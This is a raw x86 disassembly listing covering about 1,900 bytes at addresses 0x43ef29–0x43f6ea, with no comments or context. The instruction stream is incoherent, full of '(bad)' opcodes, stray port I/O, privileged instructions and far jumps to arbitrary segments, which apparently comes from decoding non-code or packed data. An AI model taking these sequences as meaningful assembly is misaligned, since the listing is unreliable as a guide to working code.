  43ef29:	pusha  
  43ef2a:	xchg   esp,eax
  43ef2b:	idiv   DWORD PTR [edi+0x78]
  43ef2e:	inc    ebx
  43ef2f:	and    al,0xb9
  43ef31:	ret    
  43ef32:	out    dx,al
  43ef33:	in     al,0x15
  43ef35:	loopne 0x43eef7
  43ef37:	xor    eax,0xf69da71b
  43ef3c:	and    DWORD PTR [eax+0x24],0x1b63b3d4
  43ef43:	fdiv   st,st(4)
  43ef45:	adc    ebp,esi
  43ef47:	les    ebp,FWORD PTR [ebx-0x63]
  43ef4a:	add    BYTE PTR [edi],ah
  43ef4c:	mov    bh,BYTE PTR [ebp+0x40ca0b0]
  43ef52:	adc    eax,0x6c6b6c31
  43ef57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ef58:	(bad)  
  43ef59:	cli    
  43ef5a:	out    dx,al
  43ef5b:	xor    al,0xc5
  43ef5d:	sub    al,0x3
  43ef5f:	push   edi
  43ef60:	iret   
  43ef61:	dec    ebx
  43ef62:	dec    edx
  43ef63:	mov    eax,ds:0x9986303c
  43ef68:	repz push ecx
  43ef6a:	popa   
  43ef6b:	sbb    DWORD PTR [esi+0x73],ebx
  43ef6e:	cmc    
  43ef6f:	or     eax,0x2ed38afd
  43ef74:	xor    al,0x63
  43ef76:	add    ah,dh
  43ef78:	pop    esi
  43ef79:	aam    0x3e
  43ef7b:	inc    ebx
  43ef7c:	sbb    esp,DWORD PTR [edx-0x29]
  43ef7f:	fcomp  DWORD PTR [esi+0x5c]
  43ef82:	stos   BYTE PTR es:[edi],al
  43ef83:	inc    ebx
  43ef84:	adc    BYTE PTR [ebx],dh
  43ef86:	xor    al,0xcf
  43ef88:	mov    DWORD PTR [ecx+0x4e],ebx
  43ef8b:	cmp    ebp,DWORD PTR [esi-0x19]
  43ef8e:	daa    
  43ef8f:	icebp  
  43ef90:	mov    esp,0x5e15973d
  43ef95:	std    
  43ef96:	jge    0x43ef9d
  43ef98:	inc    ebp
  43ef99:	push   ds
  43ef9a:	popf   
  43ef9b:	fisubr DWORD PTR [esp+eax*2+0x37]
  43ef9f:	pop    ecx
  43efa0:	xor    cl,ah
  43efa2:	in     eax,0x8f
  43efa4:	imul   ecx,DWORD PTR [ecx+0x5d],0xba83645d
  43efab:	daa    
  43efac:	add    DWORD PTR [edx+0x1fee8150],ebx
  43efb2:	mov    DWORD PTR [edx-0x5e875780],edx
  43efb8:	test   DWORD PTR ds:0xd8465729,esi
  43efbe:	push   edx
  43efbf:	mov    eax,0x9f2a5665
  43efc4:	add    ecx,esp
  43efc6:	push   ebx
  43efc7:	enter  0xa3f1,0xde
  43efcb:	mov    al,ds:0xb1092956
  43efd0:	sbb    BYTE PTR [edi-0x75],0x6
  43efd4:	out    dx,eax
  43efd5:	jmp    0x3f5a6ac8
  43efda:	xchg   DWORD PTR [eax],ecx
  43efdc:	push   ecx
  43efdd:	(bad)  
  43efde:	jg     0x43ef81
  43efe0:	jmp    0x43efc8
  43efe2:	pause  
  43efe4:	enter  0x5ecc,0x8a
  43efe8:	pop    esi
  43efe9:	sub    al,0xa7
  43efeb:	sbb    al,0xcb
  43efed:	(bad)  
  43efef:	stc    
  43eff0:	mov    dl,0x60
  43eff2:	push   cs
  43eff3:	xor    ah,BYTE PTR [edx+edi*2]
  43eff6:	jmp    DWORD PTR [edx+0x4ee0fc5]
  43effc:	lock jp 0x43f03e
  43efff:	test   al,0xfe
  43f001:	xor    cl,BYTE PTR [eax+0x1cf8f3a1]
  43f007:	mov    esi,0xb11603e7
  43f00c:	push   0xffffffcb
  43f00e:	or     bl,BYTE PTR [eax+0x77]
  43f011:	ret    
  43f012:	out    dx,al
  43f013:	stos   DWORD PTR es:[edi],eax
  43f014:	cmp    DWORD PTR [edx+0x59],ebx
  43f017:	enter  0x6124,0x66
  43f01b:	lods   eax,DWORD PTR ds:[esi]
  43f01c:	popa   
  43f01d:	push   eax
  43f01e:	pop    esi
  43f01f:	pop    ds
  43f020:	fmul   st,st(1)
  43f022:	out    dx,al
  43f023:	icebp  
  43f024:	cld    
  43f025:	pop    ds
  43f026:	cs mov dh,0x53
  43f029:	dec    eax
  43f02a:	jmp    0xd134:0x8c77dda0
  43f031:	pop    ss
  43f032:	rcl    esp,1
  43f034:	repz mov ah,0xee
  43f037:	mov    bl,0x12
  43f039:	mov    bh,0x1f
  43f03b:	gs dec esp
  43f03d:	jl     0x43efcc
  43f03f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f040:	push   edx
  43f041:	push   es
  43f042:	(bad)  
  43f043:	xor    BYTE PTR [ebp*2-0x562c9372],cl
  43f04a:	out    dx,al
  43f04b:	imul   edi,DWORD PTR [ebx+0x6ed5e18f],0x9ca202bc
  43f055:	fwait
  43f056:	jae    0x43f007
  43f058:	and    DWORD PTR [ecx-0x19229087],eax
  43f05e:	xchg   edi,eax
  43f05f:	add    al,0xa3
  43f061:	sbb    DWORD PTR [esi+0x41],esi
  43f064:	mov    bl,0x23
  43f066:	pop    es
  43f067:	sub    eax,0x7d526b86
  43f06c:	pop    esi
  43f06d:	fidiv  WORD PTR [ecx-0x10]
  43f070:	cmp    al,0x3
  43f072:	dec    eax
  43f073:	mov    ds:0xa12329cd,al
  43f078:	push   0x2502b176
  43f07d:	sbb    eax,0x1a5e5178
  43f082:	jno    0x43f066
  43f084:	inc    DWORD PTR [ecx+0x24]
  43f087:	sbb    eax,0x2d031933
  43f08c:	pop    esi
  43f08d:	ins    BYTE PTR es:[edi],dx
  43f08e:	inc    ecx
  43f08f:	push   ss
  43f090:	mov    esp,0x330f3d56
  43f095:	push   ss
  43f096:	xchg   ebp,eax
  43f097:	mov    eax,ds:0xb32d506a
  43f09c:	rcl    DWORD PTR [ecx-0x6f],cl
  43f09f:	mov    ds:0x12558922,al
  43f0a4:	test   al,0x94
  43f0a6:	cs dec ecx
  43f0a8:	mov    edi,0xa4feeea2
  43f0ad:	cmp    DWORD PTR [esi-0x28],edx
  43f0b0:	outs   dx,BYTE PTR ds:[esi]
  43f0b1:	jbe    0x43f0ec
  43f0b3:	test   al,0xee
  43f0b5:	ja     0x43f05f
  43f0b7:	ja     0x43f0f2
  43f0b9:	inc    ecx
  43f0ba:	sub    ebx,DWORD PTR [ebx-0x6618402e]
  43f0c0:	lds    ebp,FWORD PTR [ebx]
  43f0c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f0c3:	fidivr WORD PTR [esi-0x59]
  43f0c6:	rcr    cl,0x15
  43f0c9:	popa   
  43f0ca:	cdq    
  43f0cb:	add    edx,DWORD PTR [ecx]
  43f0cd:	inc    eax
  43f0ce:	mul    BYTE PTR [ebx-0x47]
  43f0d1:	out    0xeb,eax
  43f0d3:	sbb    eax,DWORD PTR [ebx-0x2de2d98d]
  43f0d9:	loopne 0x43f09e
  43f0db:	outs   dx,BYTE PTR ds:[esi]
  43f0dc:	and    al,0x28
  43f0de:	jno    0x43f085
  43f0e0:	mov    ds:0x79e81df8,eax
  43f0e5:	loopne 0x43f0a6
  43f0e7:	push   ebp
  43f0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f0e9:	imul   dh
  43f0eb:	scas   al,BYTE PTR es:[edi]
  43f0ec:	add    esi,DWORD PTR [eax-0x3a94a749]
  43f0f2:	ret    0x78a0
  43f0f5:	rcl    DWORD PTR [eax-0x254bba7f],1
  43f0fb:	cld    
  43f0fc:	cmp    al,BYTE PTR [ebx-0x43]
  43f0ff:	je     0x43f15f
  43f101:	sub    al,0xf7
  43f103:	lea    ebp,[ecx-0x665e8645]
  43f109:	jp     0x43f11c
  43f10b:	add    ebp,esi
  43f10d:	xlat   BYTE PTR ds:[ebx]
  43f10e:	mov    bl,0x63
  43f110:	pop    esi
  43f111:	aaa    
  43f112:	xchg   edi,eax
  43f113:	hlt    
  43f114:	(bad)  
  43f115:	cmp    bl,BYTE PTR ds:0xb560c52b
  43f11b:	(bad)  
  43f11c:	call   0x74a2ec71
  43f121:	inc    ecx
  43f122:	out    dx,al
  43f123:	daa    
  43f124:	(bad)  
  43f128:	xchg   DWORD PTR gs:[ebx+0x31],ebp
  43f12c:	dec    ebx
  43f12d:	popa   
  43f12e:	mov    edi,0xaf07a833
  43f133:	lock lods eax,DWORD PTR ds:[esi]
  43f135:	in     al,dx
  43f136:	out    0xdc,eax
  43f138:	hlt    
  43f139:	add    eax,0xe6de5ebc
  43f13e:	mov    ds:0x605e8c1c,eax
  43f143:	test   DWORD PTR [edx+0x1e82937e],edi
  43f149:	retf   0xff19
  43f14c:	pop    esi
  43f14d:	cmp    al,0xb
  43f14f:	fstp   TBYTE PTR [eax+0x51]
  43f152:	push   edx
  43f153:	rcl    esp,1
  43f155:	pusha  
  43f156:	jl     0x43f16c
  43f158:	cmp    al,0x26
  43f15a:	sbb    bh,BYTE PTR [ebx+ecx*1-0x51]
  43f15e:	out    dx,al
  43f15f:	push   esp
  43f160:	imul   ebp,esp,0x5e
  43f163:	test   eax,0xa0da4f8e
  43f168:	push   esp
  43f169:	mov    DWORD PTR [ebx],ecx
  43f16b:	dec    esp
  43f16c:	xchg   edx,eax
  43f16d:	mov    bh,0xd8
  43f16f:	push   edi
  43f170:	pop    esi
  43f171:	ins    DWORD PTR es:[edi],dx
  43f172:	xchg   ebx,eax
  43f173:	shl    DWORD PTR [edx+ebx*2],0xcb
  43f177:	outs   dx,BYTE PTR ds:[esi]
  43f178:	scas   eax,DWORD PTR es:[edi]
  43f179:	pusha  
  43f17a:	jp     0x43f121
  43f17c:	push   ss
  43f17d:	mov    BYTE PTR [eax-0x27],bh
  43f180:	jno    0x43f1ec
  43f182:	out    dx,al
  43f183:	mov    eax,ds:0x8f5e47a1
  43f188:	add    ch,BYTE PTR [eax+0x193a18b]
  43f18e:	jecxz  0x43f1c3
  43f190:	jns    0x43f11b
  43f192:	call   0x994b:0xa9ae5e98
  43f199:	sbb    al,BYTE PTR [eax-0x4f]
  43f19c:	jo     0x43f1e0
  43f19e:	add    DWORD PTR [eax-0x3390202b],esp
  43f1a4:	ret    0xa735
  43f1a7:	push   0xc6ee96db
  43f1ac:	adc    ah,BYTE PTR [esi+0x27edaa7c]
  43f1b2:	pusha  
  43f1b3:	mov    ds:0xca686384,al
  43f1b8:	lods   al,BYTE PTR ds:[esi]
  43f1b9:	out    0xa8,eax
  43f1bb:	pop    ss
  43f1bc:	pushf  
  43f1bd:	je     0x43f1ad
  43f1bf:	mov    cl,0x90
  43f1c1:	aad    0x1e
  43f1c3:	(bad)  
  43f1c4:	jge    0x43f1ee
  43f1c6:	outs   dx,BYTE PTR ds:[esi]
  43f1c7:	mov    al,ds:0x35fa4317
  43f1cc:	ds test al,0x1
  43f1cf:	or     al,0x6c
  43f1d1:	cs out dx,al
  43f1d3:	mov    edi,0xd1440377
  43f1d8:	push   0xb2774d4f
  43f1dd:	pusha  
  43f1de:	or     DWORD PTR [ebp+0x4f],ebp
  43f1e1:	jnp    0x43f1e6
  43f1e3:	cmc    
  43f1e4:	xchg   edx,eax
  43f1e5:	xor    eax,DWORD PTR [edx]
  43f1e7:	fcmovb st,st(4)
  43f1e9:	jg     0x43f219
  43f1eb:	cmp    ebx,DWORD PTR [ebx]
  43f1ed:	xor    edi,DWORD PTR ds:0x136073ed
  43f1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f1f4:	fldenv [ebx]
  43f1f6:	pop    edx
  43f1f7:	aaa    
  43f1f8:	mov    ds:0x2249eece,eax
  43f1fd:	movups XMMWORD PTR [ecx-0x5f10813a],xmm2
  43f204:	sbb    eax,0xf08b9037
  43f209:	mov    ebx,0x2938e7b3
  43f20e:	mov    ebp,0xbf900320
  43f213:	icebp  
  43f214:	ins    DWORD PTR es:[edi],dx
  43f215:	dec    edx
  43f216:	fsub   DWORD PTR [eax-0x1b1a0d04]
  43f21c:	retf   
  43f21d:	fist   DWORD PTR [edx-0x187ca1e0]
  43f223:	sahf   
  43f224:	or     BYTE PTR [edi],al
  43f226:	icebp  
  43f227:	call   0x2f17:0xc9476049
  43f22e:	pop    ss
  43f22f:	adc    eax,0x55346fb7
  43f234:	daa    
  43f235:	jmp    0x33164e27
  43f23a:	xchg   edx,eax
  43f23b:	addr16 xchg ecx,eax
  43f23d:	and    cl,BYTE PTR [esi]
  43f23f:	pop    ebx
  43f240:	(bad)  
  43f241:	pusha  
  43f242:	inc    edi
  43f243:	punpckldq mm0,DWORD PTR [ecx]
  43f246:	jp     0x43f1ff
  43f248:	jmp    esp
  43f24a:	out    0x9d,eax
  43f24c:	or     esp,esi
  43f24e:	aam    0x30
  43f250:	ds (bad) 
  43f253:	pop    esi
  43f254:	in     eax,0x60
  43f256:	sub    DWORD PTR [esi-0x74],edx
  43f259:	imul   edi,DWORD PTR [eax+eiz*8],0x8eeaf296
  43f260:	mov    ebp,0x9b4a7918
  43f265:	(bad)  
  43f266:	out    dx,al
  43f267:	ror    DWORD PTR [ecx+0x3b775521],0x2a
  43f26e:	inc    edi
  43f26f:	out    dx,eax
  43f270:	cwde   
  43f271:	pusha  
  43f272:	xor    ch,BYTE PTR [ebp+0x178049ff]
  43f278:	adc    al,al
  43f27a:	out    dx,al
  43f27b:	or     DWORD PTR [ebx-0x61d54a50],ebx
  43f281:	(bad)  
  43f282:	and    DWORD PTR [ebx+0x45b36145],eax
  43f288:	push   0x6
  43f28a:	mov    eax,ds:0xee909658
  43f28f:	jbe    0x43f297
  43f291:	push   ebp
  43f292:	fiadd  DWORD PTR [edx-0x5f243f2a]
  43f298:	repnz dec edi
  43f29a:	mov    ?,WORD PTR [edx-0x52390e5e]
  43f2a0:	imul   ecx,DWORD PTR ss:[ecx+0x20],0x1a5acc0
  43f2a8:	push   ds
  43f2a9:	add    eax,0x678ce874
  43f2ae:	(bad)
  43f2b3:	(bad)  
  43f2b5:	push   0xf1a15d18
  43f2ba:	out    0x3a,eax
  43f2bc:	and    DWORD PTR [eax],0xfffffff9
  43f2bf:	sub    ebp,esi
  43f2c1:	pop    ss
  43f2c2:	cs repz and al,0x61
  43f2c6:	rdtsc  
  43f2c8:	les    ecx,FWORD PTR [ebp+0x16]
  43f2cb:	push   0xffffff81
  43f2cd:	sub    eax,0x38435ee
  43f2d2:	inc    edi
  43f2d3:	fwait
  43f2d4:	mov    al,ds:0xd4a17335
  43f2d9:	jmp    0xed6d7f82
  43f2de:	addr16 push ecx
  43f2e0:	pop    ebx
  43f2e1:	ja     0x43f360
  43f2e3:	pusha  
  43f2e4:	push   esi
  43f2e5:	aaa    
  43f2e6:	(bad)  
  43f2e7:	fwait
  43f2e8:	or     ah,BYTE PTR [esi+0x7f]
  43f2eb:	mov    ds:0x6db158ca,al
  43f2f0:	cmp    eax,ebx
  43f2f2:	sub    BYTE PTR [ecx-0x22ffa3d6],al
  43f2f8:	test   BYTE PTR [edi+0x5102fb7f],ah
  43f2fe:	out    dx,al
  43f2ff:	adc    dh,BYTE PTR [esi+esi*8-0x412b010b]
  43f306:	ret    
  43f307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f308:	call   0xb66ded56
  43f30d:	mov    al,0x2
  43f30f:	ficomp DWORD PTR ds:0x7418ed4b
  43f315:	fcom   QWORD PTR [edi-0x21cb67dd]
  43f31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f31c:	dec    esi
  43f31d:	popa   
  43f31e:	adc    al,bh
  43f320:	push   0x6c
  43f322:	sub    BYTE PTR [ebx],bl
  43f324:	ja     0x43f32b
  43f326:	xlat   BYTE PTR ds:[ebx]
  43f327:	jecxz  0x43f387
  43f329:	out    0x49,eax
  43f32b:	fild   DWORD PTR [edi]
  43f32d:	push   ebp
  43f32e:	enter  0xa972,0x2b
  43f332:	jge    0x43f33d
  43f334:	jne    0x43f35c
  43f336:	pop    ss
  43f337:	mov    eax,ds:0x92f807ac
  43f33c:	ins    BYTE PTR es:[edi],dx
  43f33d:	test   DWORD PTR [ebx],0xafcc5e06
  43f343:	inc    ecx
  43f344:	inc    edi
  43f345:	out    0x57,eax
  43f347:	and    esp,ecx
  43f349:	pop    esi
  43f34a:	(bad)  
  43f34b:	test   ebp,0xfeff3669
  43f351:	mov    esi,0x6e5d1c63
  43f356:	mov    gs,WORD PTR [edx-0xe]
  43f359:	push   esp
  43f35a:	lods   al,BYTE PTR ds:[esi]
  43f35b:	loopne 0x43f3c7
  43f35d:	cs mov bh,0xa1
  43f360:	inc    esp
  43f361:	push   ds
  43f362:	aam    0x2
  43f364:	mov    eax,0xc9e1729a
  43f369:	add    eax,0x575e5cca
  43f36e:	into   
  43f36f:	shr    DWORD PTR [ebx],cl
  43f371:	adc    BYTE PTR [edx],cl
  43f373:	xor    ah,BYTE PTR [ebx+0x596f6260]
  43f379:	dec    esi
  43f37a:	loopne 0x43f350
  43f37c:	xor    dl,cl
  43f37e:	out    dx,al
  43f37f:	pop    esp
  43f380:	enter  0x9a3e,0x90
  43f384:	mov    bx,0xa0bf
  43f388:	adc    BYTE PTR [ebx],bl
  43f38a:	rcl    DWORD PTR [eax-0x7726f6ec],1
  43f390:	clc    
  43f391:	stos   DWORD PTR es:[edi],eax
  43f392:	out    dx,al
  43f393:	jl     0x43f346
  43f395:	and    al,0xa3
  43f397:	inc    esi
  43f398:	out    0xf,eax
  43f39a:	pop    eax
  43f39b:	mov    eax,ds:0x54919bc6
  43f3a0:	bound  ecx,QWORD PTR [edi]
  43f3a2:	in     eax,dx
  43f3a3:	xchg   edi,eax
  43f3a4:	pop    esi
  43f3a5:	mov    bl,0x5c
  43f3a7:	(bad)  
  43f3a9:	shl    DWORD PTR [edi+0x1e60c535],cl
  43f3af:	pop    edi
  43f3b0:	mov    ds:0xee1d5380,eax
  43f3b5:	in     al,0x1
  43f3b7:	add    eax,0x20aea07a
  43f3bc:	push   es
  43f3bd:	xor    al,0x85
  43f3bf:	out    dx,al
  43f3c0:	test   DWORD PTR [eax+0x7c],esp
  43f3c3:	xor    eax,0x7ff134ce
  43f3c8:	adc    al,0xc5
  43f3ca:	xchg   BYTE PTR [esi+ebx*2-0x2e6450a6],ah
  43f3d1:	shl    DWORD PTR [edx+0x46],cl
  43f3d4:	or     DWORD PTR [ecx+0x70],esp
  43f3d7:	push   esp
  43f3d8:	dec    esp
  43f3d9:	pop    ebp
  43f3da:	mov    ch,dl
  43f3dc:	fild   DWORD PTR [esi-0x12]
  43f3df:	xchg   ebp,eax
  43f3e0:	idiv   DWORD PTR [edi]
  43f3e2:	sbb    al,0x1e
  43f3e4:	call   0x46e57491
  43f3e9:	lods   al,BYTE PTR ds:[esi]
  43f3ea:	(bad)  
  43f3eb:	cmp    eax,0xccacf1e2
  43f3f0:	in     eax,dx
  43f3f1:	test   esp,ebp
  43f3f3:	mov    esi,0xa5be31c2
  43f3f8:	xchg   esp,eax
  43f3f9:	add    esi,ebp
  43f3fb:	mov    BYTE PTR [edx],dh
  43f3fd:	(bad)  
  43f3fe:	bound  ebp,QWORD PTR [ebx]
  43f400:	pop    esi
  43f401:	adc    al,0x59
  43f403:	les    eax,FWORD PTR [edx+edx*8-0x73]
  43f407:	mov    bl,0x1c
  43f409:	popa   
  43f40a:	xor    bh,BYTE PTR [ebx+0x6217bb03]
  43f410:	cmp    ebx,eax
  43f412:	out    dx,al
  43f413:	call   0x136f:0xa84e8871
  43f41a:	sbb    BYTE PTR [ecx+0x732561dd],ah
  43f420:	leave  
  43f421:	int3   
  43f422:	and    DWORD PTR [esp+eax*4-0x4b],eax
  43f426:	out    dx,al
  43f427:	add    bh,bl
  43f429:	mov    esi,0xb4c43860
  43f42e:	shl    DWORD PTR [eax-0x54fe0373],0x72
  43f435:	es aam 0x6f
  43f438:	pop    esi
  43f439:	push   ecx
  43f43a:	mov    WORD PTR ds:0x9be199d8,cs
  43f440:	jmp    0xdfd3:0x5727c460
  43f447:	lock push ebp
  43f449:	shr    esi,1
  43f44b:	cmp    al,BYTE PTR [ecx-0x4]
  43f44e:	test   eax,0xd64931e8
  43f453:	js     0x43f4bf
  43f455:	pop    ecx
  43f456:	dec    ebx
  43f457:	push   ss
  43f458:	lods   eax,DWORD PTR ds:[esi]
  43f459:	pop    ebx
  43f45a:	test   al,0xa4
  43f45d:	xchg   esi,eax
  43f45e:	ss cs pop esi
  43f461:	ret    0xebc6
  43f464:	pop    ebx
  43f465:	test   eax,0x23c4a431
  43f46a:	daa    
  43f46b:	mov    eax,ds:0x7646c019
  43f470:	das    
  43f471:	sbb    eax,ecx
  43f473:	fstp   QWORD PTR [esi+0x10]
  43f476:	mov    ah,0xe9
  43f478:	outs   dx,DWORD PTR ds:[esi]
  43f479:	pop    edi
  43f47a:	push   edx
  43f47b:	sbb    BYTE PTR [eax+eiz*2+0x2f7598f2],al
  43f482:	shl    BYTE PTR [edi],0x9d
  43f485:	and    edi,0x51
  43f488:	scas   al,BYTE PTR es:[edi]
  43f489:	mov    ecx,edx
  43f48b:	push   0xffffffae
  43f48d:	push   edx
  43f48e:	and    eax,0xf92aa6cd
  43f493:	mov    al,ds:0x248bf321
  43f498:	jg     0x43f4ef
  43f49a:	pusha  
  43f49b:	addr16 pop esi
  43f49d:	lahf   
  43f49e:	sbb    dh,BYTE PTR [ecx-0x41c2d608]
  43f4a4:	mov    dl,0x60
  43f4a6:	mov    ebx,0xe5b6910c
  43f4ab:	cmp    DWORD PTR [ecx-0x6d],0xed1631ee
  43f4b2:	mov    edx,0xd47e1312
  43f4b7:	test   BYTE PTR [ebx+0x4a],al
  43f4ba:	lock inc esi
  43f4bc:	mov    cl,0x42
  43f4be:	fcmove st,st(7)
  43f4c0:	cmp    BYTE PTR [ecx],ah
  43f4c2:	xchg   BYTE PTR [edx+0x6],ah
  43f4c5:	or     eax,0xc45e2326
  43f4ca:	mov    dl,0x93
  43f4cc:	mov    ah,0x9d
  43f4ce:	fwait
  43f4cf:	in     eax,0xca
  43f4d1:	pusha  
  43f4d2:	or     al,0x58
  43f4d4:	pusha  
  43f4d5:	div    BYTE PTR [ecx-0x1110cf03]
  43f4db:	shl    BYTE PTR [edx],1
  43f4dd:	mov    ebp,0x83528452
  43f4e2:	inc    esi
  43f4e3:	mov    eax,ds:0xc09f9de
  43f4e8:	xchg   BYTE PTR [ebx-0x4b],ah
  43f4eb:	cmp    edx,DWORD PTR [edx+0x6f]
  43f4ee:	inc    ecx
  43f4ef:	cwde   
  43f4f0:	sahf   
  43f4f1:	inc    edx
  43f4f2:	inc    BYTE PTR [ecx]
  43f4f4:	aad    0xf4
  43f4f6:	pop    ebp
  43f4f7:	mov    eax,ds:0xbfd5fffc
  43f4fc:	jne    0x43f493
  43f4fe:	xchg   edi,eax
  43f4ff:	in     eax,dx
  43f500:	pop    esi
  43f501:	shl    DWORD PTR [eax-0x14],1
  43f504:	adc    al,BYTE PTR [edi+0x296556c7]
  43f50a:	adc    esp,DWORD PTR [esp+edi*8-0x7abd947e]
  43f511:	gs fisubr WORD PTR ds:[esi-0x72]
  43f516:	out    dx,al
  43f517:	cmp    al,0x25
  43f519:	les    ebx,FWORD PTR [ebx-0x43]
  43f51c:	push   es
  43f51d:	pop    ds
  43f51e:	fstp   DWORD PTR [ebx-0x2e156344]
  43f524:	pop    ebx
  43f525:	sub    BYTE PTR [ebx-0x67be0f42],bh
  43f52b:	dec    ebp
  43f52c:	mul    eax
  43f52e:	xchg   ebp,eax
  43f52f:	imul   eax,DWORD PTR [eax+0x5e8b69a4],0xc2813c6e
  43f539:	out    dx,eax
  43f53a:	imul   BYTE PTR [eax]
  43f53c:	adc    cl,BYTE PTR [ebx+0x49]
  43f53f:	pop    ebx
  43f540:	(bad)  [eax+0x38]
  43f543:	fcomp  DWORD PTR [ebx+0x5ee74f1c]
  43f549:	adc    eax,0xd4d9045b
  43f54e:	test   DWORD PTR [ecx+0x5a3ec17d],ecx
  43f554:	arpl   cx,sp
  43f556:	add    ah,BYTE PTR [edx+eiz*4-0x20]
  43f55a:	icebp  
  43f55b:	pusha  
  43f55c:	je     0x43f4fa
  43f55e:	jmp    0xba16353
  43f563:	scas   eax,DWORD PTR es:[edi]
  43f564:	cmp    BYTE PTR ds:0x237efa54,0xe4
  43f56b:	cwde   
  43f56c:	pop    esi
  43f56d:	cs jl  0x43f561
  43f570:	inc    ecx
  43f571:	pop    ds
  43f572:	sub    esi,DWORD PTR [ebx+0x1b]
  43f575:	popa   
  43f576:	data16 mov WORD PTR [esi-0x623a634d],gs
  43f57d:	leave  
  43f57e:	jmp    0x43f51d
  43f580:	adc    DWORD PTR [ecx-0x66db7aeb],ebx
  43f586:	cwde   
  43f587:	pop    edi
  43f588:	and    esp,DWORD PTR [ebx+0x7e]
  43f58b:	push   ds
  43f58c:	pop    esi
  43f58d:	mov    ch,BYTE PTR [ebx+esi*2-0x71bb1b7f]
  43f594:	pop    ebx
  43f595:	iret   
  43f596:	cdq    
  43f597:	fs cmp eax,0xfbcf8eab
  43f59d:	jb     0x43f588
  43f59f:	(bad)  
  43f5a0:	in     eax,0x3d
  43f5a2:	addr16 mov eax,ds:0xbd7a
  43f5a6:	mov    bh,0xf1
  43f5a8:	xor    al,0xff
  43f5aa:	out    dx,al
  43f5ab:	dec    eax
  43f5ac:	mov    eax,0x8c49f4e0
  43f5b1:	ret    0xa100
  43f5b4:	data16 aaa 
  43f5b6:	fidiv  DWORD PTR [eax+0x19]
  43f5b9:	mov    dh,0x64
  43f5bb:	nop
  43f5bc:	pop    esi
  43f5bd:	idiv   cl
  43f5bf:	popf   
  43f5c0:	fild   WORD PTR [ebp+0x3c]
  43f5c3:	loope  0x43f5ca
  43f5c5:	pop    edi
  43f5c6:	add    ch,BYTE PTR [ecx]
  43f5c8:	and    ebx,DWORD PTR [ebp+0x7f]
  43f5cb:	data16 sahf 
  43f5cd:	in     eax,dx
  43f5ce:	cli    
  43f5cf:	jae    0x43f605
  43f5d1:	aam    0xeb
  43f5d3:	push   cs
  43f5d4:	and    BYTE PTR [edx-0x3f854250],0x10
  43f5db:	ins    DWORD PTR es:[edi],dx
  43f5dc:	aaa    
  43f5dd:	adc    dh,bh
  43f5df:	mov    al,ds:0xec31834c
  43f5e4:	mov    al,ds:0x5a13b25f
  43f5e9:	sub    al,0x70
  43f5eb:	ss xchg edx,eax
  43f5ed:	fldenv [edi-0x50]
  43f5f0:	cmp    esp,eax
  43f5f2:	mov    al,ds:0x4ac5e861
  43f5f7:	inc    esp
  43f5f8:	pop    esi
  43f5f9:	inc    ecx
  43f5fa:	mov    al,ds:0xf0349d4b
  43f5ff:	sub    eax,edi
  43f601:	inc    ebx
  43f602:	pop    edx
  43f603:	xor    eax,0xf4bde12c
  43f608:	sbb    al,0xb6
  43f60a:	sbb    eax,0x885b5dd6
  43f60f:	out    dx,al
  43f610:	(bad)  ds:0xc5966db0
  43f616:	mov    esp,0xa30267a0
  43f61b:	div    BYTE PTR [ecx]
  43f61d:	lahf   
  43f61e:	sbb    ebp,esp
  43f620:	pop    esi
  43f621:	js     0x43f5e8
  43f623:	mov    edi,0xeb13842d
  43f629:	pusha  
  43f62a:	mov    edx,0x6faa4441
  43f62f:	pop    ebx
  43f630:	mov    edx,0x8c57ee73
  43f635:	inc    esi
  43f636:	jmp    0x86f3:0x1a832b92
  43f63d:	das    
  43f63e:	sbb    eax,0xad612473
  43f643:	or     al,0x76
  43f645:	sbb    DWORD PTR [ebp-0x9db6ee],0x8
  43f64c:	push   esi
  43f64d:	mov    esp,0xb860052e
  43f652:	push   ss
  43f653:	retf   
  43f654:	sahf   
  43f655:	ror    BYTE PTR [ecx+eiz*4-0x36],0x22
  43f65a:	dec    esi
  43f65b:	in     al,dx
  43f65c:	xchg   DWORD PTR [ecx-0x2ba1ce0f],edi
  43f662:	mov    al,ch
  43f664:	add    DWORD PTR ss:[esi-0x55],ecx
  43f668:	mov    bh,0x60
  43f66a:	imul   eax,DWORD PTR [edx],0xc757f5ca
  43f670:	mov    edi,0xdcc9ee83
  43f675:	jns    0x43f6a7
  43f677:	popf   
  43f678:	add    al,BYTE PTR [edi-0x3ab75a04]
  43f67e:	and    eax,0x6d614252
  43f683:	imul   ebx,DWORD PTR ds:0x5d84ec82,0x4e1cedab
  43f68d:	fisubr WORD PTR [esi-0x42]
  43f690:	ds inc esp
  43f692:	lahf   
  43f693:	call   0x7dde:0x70ac6202
  43f69a:	jno    0x43f6fe
  43f69c:	in     eax,dx
  43f69d:	cwde   
  43f69e:	push   eax
  43f69f:	pop    esi
  43f6a0:	ins    BYTE PTR es:[edi],dx
  43f6a1:	xor    ebp,ebp
  43f6a3:	mov    ebx,ebx
  43f6a5:	pop    ecx
  43f6a6:	imul   ebx,esi,0x20
  43f6a9:	cmp    al,0x14
  43f6ab:	sub    DWORD PTR [esi+0x175cee26],0x39f91042
  43f6b5:	aam    0xd4
  43f6b7:	mov    WORD PTR [edx-0x2a9f1242],?
  43f6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f6be:	leave  
  43f6bf:	and    al,0x1a
  43f6c1:	out    0xee,eax
  43f6c3:	push   0xfffffff3
  43f6c5:	jmp    0x30a94d22
  43f6ca:	dec    eax
  43f6cb:	jnp    0x43f6e5
  43f6cd:	popa   
  43f6ce:	dec    edi
  43f6cf:	xor    DWORD PTR [esi+eiz*2],0x17
  43f6d3:	aam    0x26
  43f6d5:	jo     0x43f6c5
  43f6d7:	adc    al,0x3f
  43f6d9:	pop    esp
  43f6da:	cmp    al,BYTE PTR [eax+0x23]
  43f6dd:	cmp    DWORD PTR [edx-0x14800b56],ebp
  43f6e3:	dec    ecx
  43f6e4:	cli    
  43f6e5:	mov    ch,0xf4
  43f6e7:	pop    ss
  43f6e8:	jbe    0x43f6b4
  43f6ea:	dec    ebx
